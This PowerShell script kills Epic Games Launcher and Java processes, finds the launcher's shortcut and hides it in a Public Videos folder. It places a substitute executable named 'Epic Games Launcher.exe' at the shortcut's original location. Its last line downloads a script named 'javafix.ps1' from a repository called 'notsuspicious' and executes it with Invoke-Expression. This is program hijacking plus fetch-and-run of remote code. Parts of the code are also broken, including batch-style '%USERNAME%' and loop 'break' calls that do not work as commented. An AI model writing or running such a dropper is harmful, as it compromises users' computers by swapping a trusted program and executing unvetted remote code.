# Kill the Epic Games Launcher process forcefully
Stop-Process -Name "java" -Force
Stop-Process -Name "javaw" -Force
Stop-Process -Name "EpicGamesLauncher" -Force

# Enable delayed expansion (not directly available in PowerShell)
Set-Variable -Name "counter" -Value 0 -Scope Script

# Loop through files recursively in the specified directory
Get-ChildItem -Path "C:\Users\%USERNAME%" -Recurse | ForEach-Object {
    # Check if the file name matches "Epic Games Launcher.lnk"
    if ($_.Name -eq "Epic Games Launcher.lnk") {
        # If found, set the path and break out of the loop
        $p = $_.FullName
        break
    }
}

# If the path is not found, perform certain actions
if (-not $p) {
    Get-ChildItem -Path "C:\Program Files" -Recurse | ForEach-Object {
    # Check if the file name matches "Epic Games Launcher.lnk"
    if ($_.Name -eq "Epic Games Launcher.lnk") {
        # If found, set the path and break out of the loop
        $p = $_.FullName
        break
    }
}
}

# If the path is found, increment the counter
$counter++
Write-Output $p
Move-Item -Path $p -Destination "C:\Users\Public\Videos\GraphicalUserInterface"
Rename-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" -NewName "§$counter.lnk"
Move-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" -Destination $p
Rename-Item -Path $p -NewName "Epic Games Launcher.exe"
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
